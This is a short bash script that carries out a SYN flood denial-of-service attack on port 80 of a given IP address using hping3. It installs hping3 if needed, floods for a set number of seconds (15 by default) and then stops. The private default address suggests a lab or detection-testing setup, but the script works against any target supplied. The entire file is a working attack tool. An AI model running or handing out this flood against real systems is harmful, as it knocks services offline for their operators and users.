#!/bin/bash
# attack_syn_flood.sh
# SYN flood attack on port 80 using hping3
# Usage: ./attack_syn_flood.sh <target_ip> [duration_seconds]

TARGET_IP="${1:-192.168.64.2}"
DURATION="${2:-15}"

echo "=========================================="
echo "Starting SYN Flood Attack"
echo "Target: $TARGET_IP:80"
echo "Duration: ${DURATION} seconds"
echo "=========================================="

if ! command -v hping3 &> /dev/null; then
    echo "hping3 not found. Installing..."
    sudo apt-get update
    sudo apt-get install -y hping3
fi

echo "[*] Flooding port 80 with SYN packets for ${DURATION} seconds..."
sudo hping3 -S --flood -p 80 $TARGET_IP &
HPING_PID=$!

sleep $DURATION

echo "[*] Stopping SYN flood..."
sudo kill -9 $HPING_PID 2>/dev/null

echo "[*] SYN flood completed at $(date)"
